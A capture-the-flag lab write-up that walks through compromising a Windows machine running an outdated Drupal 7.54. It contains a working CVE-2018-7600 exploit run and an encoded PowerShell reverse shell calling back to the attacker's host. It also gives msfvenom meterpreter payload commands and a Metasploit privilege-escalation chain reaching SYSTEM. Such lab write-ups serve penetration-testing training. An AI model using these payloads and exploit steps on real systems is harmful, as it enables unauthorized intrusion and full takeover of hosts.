

## Lab Details
- Difficulty: Medium
- OS: Windows

## Summary
- Initial access: Outdated Drupal
- Privilege escalation: Outdated Windows

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.165.179 -p- -sC -sV -A
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 00:35 -0700
Nmap scan report for 10.129.165.179
Host is up (0.24s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
| http-methods:
|_  Potentially risky methods: TRACE
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Foothold

#### Steps
- Search online and found a drupal scanner https://github.com/immunIT/drupwn
- Download and run against the target
```
$ python3 drupwn --mode enum --target http://10.129.165.179
/home/kali/Downloads/tools/drupwn/drupwn:22: SyntaxWarning: invalid escape sequence '\_'
  / __ \_______  ______ _      ______
/home/kali/Downloads/tools/drupwn/engine/__init__.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  __import__("pkg_resources").declare_namespace(__name__)

        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/

[-] Version not specified, trying to identify it

[+] Version detected: 7.54


============ Modules ============


============ Default files ============

[+] /README.txt (200)
[+] /robots.txt (200)
[+] /LICENSE.txt (200)
[+] /xmlrpc.php (200)
[+] /update.php (403)
[+] /install.php (200)

============ Users ============

[+] ***** (id=5)
[+] ***** (id=1)
<SNIP>
```
- Identified the version to be 7.54
- Search online and found POC for unauthenticated RCE https://github.com/pimps/CVE-2018-7600/tree/master
- Testing out the exploit and worked
```
$ python3 drupa7-CVE-2018-7600.py http://10.129.165.179/ -c whoami

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-dgzPp6kI61sPKAoD41pTvimItHecwS3MtIb6RbXUOEQ
[*] Triggering exploit to execute: whoami
nt authority\iusr
```
- Inject a reverse shell payload 
```
$ python3 drupa7-CVE-2018-7600.py http://10.129.165.179/ -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```
- A shell received as `nt authority\iusr`
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.165.179] 57066

PS C:\inetpub\drupal-7.54> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ========
nt authority\iusr S-1-5-17


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Enumerate the target and identified the version to be running `windows 8`
- Generate a stageless reverse shell payload using `msfvenom` and move to target 
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Your_IP> LPORT=4444 -f exe -o stageless_reverse.exe
```
- Set up the listener on `msfconsole`
```
### Setting up msfconsole listener
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.10.14.18
set LPORT 5555
run
```
- Then run the payload
- Once we have a connection background the session and run `local_exploit_suggester`
```bash
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set session 2
session => 2
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.165.179 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 10.129.165.179 - 253 exploit checks are being tried...
[+] 10.129.165.179 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable. Windows Server 2008 R2 appears vulnerable
[+] 10.129.165.179 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable. Target appears vulnerable
[+] 10.129.165.179 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
[+] 10.129.165.179 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
[+] 10.129.165.179 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.165.179 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.129.165.179 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.165.179 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
[+] 10.129.165.179 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.165.179 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.165.179 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. Windows session with multiple CPU cores detected
[+] 10.129.165.179 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. Target appears vulnerable
[+] 10.129.165.179 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
[+] 10.129.165.179 - exploit/windows/persistence/bits: The target is vulnerable. Likely exploitable
```
- Select an exploit this case i chose `cve_2019_1458_wizardopium` and run
```
msf exploit(windows/local/cve_2019_1458_wizardopium) > set session 2
session => 2
msf exploit(windows/local/cve_2019_1458_wizardopium) > set LHOST tun0
LHOST => 10.10.14.18
msf exploit(windows/local/cve_2019_1458_wizardopium) > set LPORT 9999
LPORT => 9999
msf exploit(windows/local/cve_2019_1458_wizardopium) > run
[*] Started reverse TCP handler on 10.10.14.18:9999
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Revision 16385 appears vulnerable
[*] Triggering the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 1680 launched.
[*] Reflectively injecting the DLL into 1680...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (248902 bytes) to 10.129.165.179
[*] Meterpreter session 3 opened (10.10.14.18:9999 -> 10.129.165.179:57508) at 2026-06-07 01:42:23 -0700

meterpreter > shell
Process 2488 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\temp>whoami
whoami
nt authority\system
```

## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: